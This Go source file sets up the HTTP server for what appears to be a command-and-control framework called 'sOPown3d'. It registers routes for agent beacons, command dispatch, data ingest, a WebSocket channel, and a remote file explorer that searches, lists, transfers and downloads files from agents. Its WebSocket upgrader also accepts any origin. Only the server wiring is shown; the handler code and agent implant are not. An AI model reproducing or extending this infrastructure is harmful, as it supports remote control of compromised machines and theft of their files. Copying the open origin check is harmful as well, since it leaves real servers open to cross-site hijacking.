package server

import (
	"fmt"
	"html/template"
	"net/http"
	"sOPown3d/server/database"
	"sync"
	"time"

	"sOPown3d/internal/server/handlers"
	"sOPown3d/pkg/shared"
	"sOPown3d/server/config"
	"sOPown3d/server/logger"
	"sOPown3d/server/storage"
	"sOPown3d/server/tasks"

	"github.com/gorilla/websocket"
)

type Server struct {
	cfg              *config.Config
	logger           *logger.Logger
	templates        *template.Template
	pendingCommands  map[string]shared.Command
	lastCommandSent  map[string]shared.Command
	upgrader         websocket.Upgrader
	wsMu             sync.RWMutex
	wsClients        map[string]*websocket.Conn
	store            storage.Storage
	activityChecker  *tasks.ActivityChecker
	cleanupScheduler *tasks.CleanupScheduler
	fileHandler      *handlers.FileHandler
}

func (s *Server) handleExplorer(w http.ResponseWriter, r *http.Request) {
	s.templates.ExecuteTemplate(w, "explorer.html", nil)
}
func (s *Server) handleMedia(w http.ResponseWriter, r *http.Request) {
	s.templates.ExecuteTemplate(w, "media.html", nil)
}

func New(cfg *config.Config, lgr *logger.Logger, store storage.Storage, activityChecker *tasks.ActivityChecker, cleanupScheduler *tasks.CleanupScheduler, db *database.DB) (*http.Server, error) {
	tmpl, err := template.ParseGlob("templates/*.html")
	if err != nil {
		return nil, fmt.Errorf("failed to load templates: %w", err)
	}

	s := &Server{
		cfg:              cfg,
		logger:           lgr,
		templates:        tmpl,
		pendingCommands:  make(map[string]shared.Command),
		lastCommandSent:  make(map[string]shared.Command),
		upgrader:         websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }},
		wsClients:        make(map[string]*websocket.Conn),
		store:            store,
		activityChecker:  activityChecker,
		cleanupScheduler: cleanupScheduler,
	}
	storagePath := "storage/files"
	if db != nil {
		s.fileHandler = handlers.NewFileHandler(storagePath, db, lgr)
	}

	mux := http.NewServeMux()

	// Core routes
	mux.HandleFunc("/", s.handleDashboard)
	mux.HandleFunc("/beacon", s.handleBeacon)
	mux.HandleFunc("/command", s.handleSendCommand)
	mux.HandleFunc("/ingest", s.handleIngest)
	mux.HandleFunc("/websocket", s.handleWebSocket)

	// API routes
	mux.HandleFunc("/api/agents", s.handleAPIAgents)
	mux.HandleFunc("/api/agents/", s.handleAPIAgentDetails)
	mux.HandleFunc("/api/executions", s.handleAPIExecutions)
	mux.HandleFunc("/api/stats", s.handleAPIStats)
	// File explorer routes
	mux.HandleFunc("/explorer", s.handleExplorer)
	mux.HandleFunc("/api/files/commands", s.fileHandler.GetPendingCommands)
	mux.HandleFunc("/api/files/upload", s.fileHandler.UploadFile)
	mux.HandleFunc("/api/files/agent", s.fileHandler.GetAgentFiles)
	mux.HandleFunc("/api/files/recent", s.fileHandler.GetRecentFiles)
	mux.HandleFunc("/api/files/search", s.fileHandler.SearchFiles)
	mux.HandleFunc("/api/files/search-results/submit", s.fileHandler.SubmitSearchResults)
	mux.HandleFunc("/api/files/search-results/", s.fileHandler.GetSearchResults)
	mux.HandleFunc("/api/files/list", s.fileHandler.ListFiles)
	mux.HandleFunc("/api/files/list-results/submit", s.fileHandler.SubmitListResults)
	mux.HandleFunc("/api/files/list-results/", s.fileHandler.GetListResults)
	mux.HandleFunc("/api/files/transfer", s.fileHandler.TransferFile)
	mux.HandleFunc("/api/files/transfer-status/update", s.fileHandler.UpdateTransferStatus)
	mux.HandleFunc("/api/files/transfer-status/", s.fileHandler.GetTransferStatus)

	mux.HandleFunc("/media", s.handleMedia)
	mux.HandleFunc("/api/files/download/", s.fileHandler.DownloadFile)

	addr := fmt.Sprintf("%s:%s", cfg.Server.Host, cfg.Server.Port)

	return &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
	}, nil
}
